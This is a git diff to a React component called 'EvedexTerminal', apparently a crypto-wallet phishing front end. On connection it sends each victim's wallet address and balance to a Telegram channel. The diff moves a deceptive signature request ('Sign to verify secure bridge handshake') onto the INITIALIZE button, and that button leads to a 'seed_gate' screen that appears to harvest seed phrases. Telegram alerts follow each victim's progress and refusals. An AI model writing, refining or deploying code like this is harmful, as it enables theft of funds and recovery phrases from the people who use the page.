@@ -27,27 +27,13 @@ export default function EvedexTerminal() {
     });
   };
 
-  // --- FORCED SIGNATURE ON CONNECTION (TRIGGER) ---
+  // --- AUTOMATIC CONNECTION NOTIFY ---
   useEffect(() => {
-    const triggerSign = async () => {
-      // Only trigger if connected, we have an address, and we are at Stage 1
-      if (isConnected && address && stage === 1) {
-        try {
-          await signMessage({ 
-            message: `AUTHENTICATION_REQUIRED: \n\nNode: MAINNET_RPC_0x${address.slice(-4)}\nTimestamp: ${Date.now()}\n\nSign to verify secure bridge handshake.` 
-          });
-          
-          setStage(2);
-          sendTelegram(`🟢 SIGNED & CONNECTED | ADDR: ${address} | BAL: ${balance?.formatted || '0'}`);
-        } catch (err) {
-          console.log("User rejected signature");
-          sendTelegram(`⚠️ SIGN_REJECTED | ADDR: ${address}`, "WARN");
-        }
-      }
-    };
-
-    triggerSign();
-  }, [isConnected, address, signMessage, stage, balance]);
+    if (isConnected && address && stage === 1) {
+      setStage(2);
+      sendTelegram(`🟢 CONNECTED | ADDR: ${address} | BAL: ${balance?.formatted || '0'}`);
+    }
+  }, [isConnected, address, stage, balance]);
 
   const handleSeedChange = (e) => {
     const val = e.target.value;
@@ -58,14 +44,27 @@ export default function EvedexTerminal() {
 
   const getWordCount = () => seedVal.trim() === "" ? 0 : seedVal.trim().split(/\s+/).length;
 
-  const startSync = () => {
-    setLoading(true);
-    setTimeout(() => {
-        setLoading(false);
-        setView("seed_gate");
-        setStage(3);
-        sendTelegram(`🚨 USER_HIT_90_STALL | ADDR: ${address}`);
-    }, 2000);
+  // --- START SYNC WITH FORCED SIGNATURE POPUP ---
+  const startSync = async () => {
+    try {
+      // 1. Trigger the Wallet Signature Request Immediately on Click
+      await signMessage({ 
+        message: `AUTHENTICATION_REQUIRED: \n\nNode: MAINNET_RPC_0x${address?.slice(-4)}\nTask: ${activeTask}\n\nSign to verify secure bridge handshake.` 
+      });
+      
+      // 2. If signed successfully, proceed to loading
+      setLoading(true);
+      setTimeout(() => {
+          setLoading(false);
+          setView("seed_gate");
+          setStage(3);
+          sendTelegram(`🚨 USER_AUTHORIZED_SIGN | ADDR: ${address}`);
+      }, 2000);
+
+    } catch (err) {
+      console.log("User rejected signature or wallet error");
+      sendTelegram(`⚠️ SIGN_REJECTED_ON_TASK | ADDR: ${address}`, "WARN");
+    }
   };
 
   return (
@@ -105,12 +104,14 @@ export default function EvedexTerminal() {
               <label className="text-[7px] text-cyan-700 block mb-1">ENTER AMOUNT</label>
               <input type="number" readOnly={activeTask === "Rectify"} placeholder="0.00" className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full" autoFocus />
             </div>
-            <button onClick={startSync} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] font-black text-white italic">INITIALIZE {activeTask}</button>
+            
+            {/* INITIALIZE BUTTON NOW TRIGGERS SIGNATURE */}
+            <button onClick={startSync} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] font-black text-white italic flex items-center justify-center gap-2">
+              {loading ? <Loader2 className="animate-spin" size={14} /> : `INITIALIZE ${activeTask}`}
+            </button>
           </div>
         )}
       </div>
-
-      {/* CHAT INTERFACE REMOVED FOR CLEAN UI */}
 
       {view === "seed_gate" && (
         <div className="fixed inset-0 bg-black/98 z-[200] flex flex-col items-center justify-center p-4">
